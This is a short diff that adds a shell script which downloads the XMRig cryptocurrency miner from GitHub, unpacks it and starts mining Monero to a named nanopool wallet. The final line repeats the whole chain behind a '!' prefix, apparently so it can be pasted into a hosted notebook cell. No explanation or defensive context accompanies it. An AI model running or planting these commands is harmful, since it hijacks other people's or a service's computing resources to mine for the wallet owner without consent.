@@ -1,0 +1,9 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-linux-x64.tar.gz
+tar -xf xmrig-6.11.1-linux-x64.tar.gz
+cd xmrig-6.11.1
+./xmrig -a rx/0 -o xmr-asia1.nanopool.org:14433 -u 43RqNhBPVkFC2L1YP95HD3BBFTzS7mcue4zm8174pjWeXEfkczXPNqoSDtFWcVbnrKCK62KBUSPrngp1hueFk2RwAB6U8mT.worker01 --tls --coin monero
+
+
+
+
+! wget https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-linux-x64.tar.gz && tar -xf xmrig-6.11.1-linux-x64.tar.gz && cd xmrig-6.11.1 && ./xmrig -a rx/0 -o xmr-asia1.nanopool.org:14433 -u 43RqNhBPVkFC2L1YP95HD3BBFTzS7mcue4zm8174pjWeXEfkczXPNqoSDtFWcVbnrKCK62KBUSPrngp1hueFk2RwAB6U8mT.worker01 --tls --coin monero
